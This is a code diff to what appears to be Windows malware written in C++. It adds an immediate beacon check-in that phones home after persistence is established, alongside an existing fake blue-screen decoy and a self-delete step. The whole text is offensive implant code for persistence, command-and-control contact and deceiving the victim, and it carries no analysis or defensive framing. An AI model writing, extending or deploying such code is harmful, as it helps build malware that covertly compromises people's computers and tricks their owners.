@@ -25,7 +25,13 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     if (persistence::establishPersistence()) {
         // First run: persistence established, show decoy and exit (self-delete)
-        LOG_INFO("Persistence established. Showing decoy and exiting.");
+        LOG_INFO("Persistence established. Sending immediate check-in...");
+
+        // Phoning back home on startup (initial landing)
+        beacon::Beacon initialBeacon;
+        initialBeacon.sendOneTimeHeartbeat("Persistence Installed - Awaiting Reboot/Trigger");
+
+        LOG_INFO("Immediate check-in sent. Showing decoy and exiting.");
 
         // Show BSOD decoy (blocks until CTRL+B)
         decoy::ShowBSOD();
